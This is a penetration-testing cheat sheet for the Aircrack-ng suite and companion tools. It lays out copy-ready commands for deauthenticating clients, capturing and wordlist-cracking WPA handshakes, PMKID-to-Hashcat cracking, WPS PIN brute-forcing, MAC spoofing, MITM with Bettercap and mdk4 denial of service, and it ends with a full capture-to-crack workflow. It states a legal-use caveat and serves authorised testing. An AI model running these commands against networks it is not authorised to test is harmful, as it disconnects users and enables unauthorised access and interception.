
# Aircrack-ng Suite — Commands & Uses (Cheat Sheet)

**Created:** September 19, 2025  
**Scope:** `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, companion tools (hcxdumptool, macchanger, kismet, reaver, etc.), workflows, troubleshooting, and legal notes.

---

## ⚠️ Legal & Ethical Reminder
Only use these tools on networks you own or have explicit written permission to test. Unauthorized interception, network disruption, or cracking is illegal in many jurisdictions.

---

## 1) Prep & interface checks
```bash
# Unblock wireless if soft-blocked
sudo rfkill unblock wifi

# Show modern wireless interfaces
iw dev

# Legacy tools
iwconfig
ifconfig
ip link show
```

---

## 2) airmon-ng — monitor mode helper
```bash
# Show recognized wireless interfaces & drivers
sudo airmon-ng

# Kill processes that interfere with monitor mode (NetworkManager, wpa_supplicant...)
sudo airmon-ng check kill

# Start monitor mode on wlan0 (creates wlan0mon or mon0)
sudo airmon-ng start wlan0

# Stop monitor mode and restore managed mode
sudo airmon-ng stop wlan0mon
```
Notes:
- After `check kill`, normal Wi-Fi may be disabled until services are restarted.
- If `airmon-ng start` fails, check driver compatibility and use `iw dev` to inspect.

---

## 3) airodump-ng — scanning & capture
```bash
# Scan all nearby APs and clients
sudo airodump-ng wlan0mon

# Focused capture: lock to channel, BSSID; write files (pcap/cap/csv)
sudo airodump-ng --bssid <AP_BSSID> -c <channel> -w /path/to/capture wlan0mon

# Save multiple formats (pcap + csv)
sudo airodump-ng --output-format pcap,csv -w capture wlan0mon

# Rotate/write every N seconds (useful for long captures)
sudo airodump-ng --write-interval 5 --bssid <BSSID> -c <CH> -w capture wlan0mon
```
Watch for the top-right of airodump-ng — it shows "WPA handshake: <BSSID>" when handshake captured.

---

## 4) aireplay-ng — injection / replay attacks
```bash
# Deauthenticate all clients (count 5)
sudo aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon

# Deauth a specific client to force reconnect
sudo aireplay-ng --deauth 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Fake authentication (useful for WEP or to stay associated)
sudo aireplay-ng --fakeauth 10 -a <AP_BSSID> -h <YOUR_MAC> wlan0mon

# Interactive replay mode
sudo aireplay-ng --interactive wlan0mon
```
Notes:
- `--deauth 0` means continuous until stopped.
- Deauth is noisy — will disconnect clients; use responsibly.

---

## 5) aircrack-ng — cracking captured handshakes or WEP IVs
```bash
# Crack WPA/WPA2 handshake using wordlist
sudo aircrack-ng -w /path/to/wordlist.txt -b <AP_BSSID> capture-01.cap

# Convert capture for WEP IV processing (J output)
sudo aircrack-ng -J output capture-01.cap
```
Tips:
- Use curated wordlists (rockyou.txt, SecLists) and rule-based generation or Hashcat for GPU speed.
- For very large cracking tasks, convert captures to Hashcat formats (see hcxtools below).

---

## 6) PMKID / modern options (hcxdumptool / hcxtools)
```bash
# Capture PMKID and handshakes (pcapng)
sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1

# Convert pcapng to Hashcat format (hashcat mode 22000)
hcxpcapngtool -o hashcat.22000 dump.pcapng
# or older: hcxpcaptool -z hash.hccapx dump.pcapng
```
Why use these:
- `hcxdumptool` can capture PMKID from AP beacons/association and is useful when client handshakes are hard to obtain.

---

## 7) WPS-related tools (use with permission)
```bash
# Find WPS-enabled APs
sudo wash -i wlan0mon

# Attempt WPS PIN recovery (very noisy & may lock AP)
sudo reaver -i wlan0mon -b <BSSID> -vv
sudo bully -b <BSSID> -i wlan0mon
```
Warning: Reaver/Bully can lock WPS or trip intrusion defenses.

---

## 8) MAC spoofing & helpers
```bash
# Bring interface down, change MAC, bring up
sudo ip link set wlan0 down
sudo macchanger -r wlan0
sudo ip link set wlan0 up

# Or using iproute2 to set specific MAC
sudo ip link set dev wlan0 address 12:34:56:78:9A:BC
```

---

## 9) Passive/advanced tools
```bash
# Kismet: passive detector & sniffer with UI & extensive logging
sudo kismet

# Bettercap: active MITM framework (Wi-Fi, BLE, proxies)
sudo bettercap -iface wlan0mon
```

---

## 10) High-impact tools (Denial/Stress — be cautious)
```bash
# mdk4 example (many modes)
sudo mdk4 wlan0mon d
```
These can severely disrupt networks; only use in lab or on permissions.

---

## 11) Utility commands & service management
```bash
# Restart NetworkManager
sudo systemctl restart NetworkManager

# Alternatively (legacy)
sudo service NetworkManager restart
```

---

## 12) Example full workflow: capture WPA handshake → crack
```bash
# 1) Kill interfering processes
sudo airmon-ng check kill

# 2) Start monitor mode
sudo airmon-ng start wlan0
# => interface: wlan0mon

# 3) Start focused capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /tmp/handshake wlan0mon

# 4) Force clients to reconnect (in another terminal)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5) Wait until airodump-ng shows "WPA handshake: AA:BB:CC:DD:EE:FF"

# 6) Crack using a wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /tmp/handshake-01.cap
```

---

## 13) Troubleshooting tips
- No handshake: ensure channel locked with `-c` and that client re-associates; try targeted deauth for the client MAC.
- Wrong interface name: check `iw dev` (drivers/versions vary: `wlan0mon`, `mon0`, `wlan0`).
- Injection fails: confirm card supports injection (monitor+injection); check chipset & driver.
- Services restart: after `airmon-ng check kill`, restore network with `systemctl start NetworkManager` or `service NetworkManager restart`.

---

## 14) Quick one-page cheat sheet (copyable)
```text
# Prep
sudo rfkill unblock wifi
iw dev
sudo airmon-ng

# Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager

# Scan & capture
sudo airodump-ng wlan0mon
sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon
sudo airodump-ng --output-format pcap,csv -w capture wlan0mon

# Deauth & injections
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT> wlan0mon
sudo aireplay-ng --fakeauth 10 -a <BSSID> -h <YOUR_MAC> wlan0mon

# Crack
sudo aircrack-ng -w /path/to/wordlist -b <BSSID> capture-01.cap

# PMKID capture -> Hashcat
sudo hcxdumptool -i wlan0mon -o dump.pcapng
hcxpcapngtool -o hashcat.22000 dump.pcapng
hashcat -m 22000 hashcat.22000 /path/to/wordlist
```

---

## 15) References & further reading
- `man` pages: `man airmon-ng`, `man airodump-ng`, `man aireplay-ng`, `man aircrack-ng`
- Aircrack-ng official docs and wiki
- hcxtools / hcxdumptool documentation
- Kismet & Bettercap documentation

---

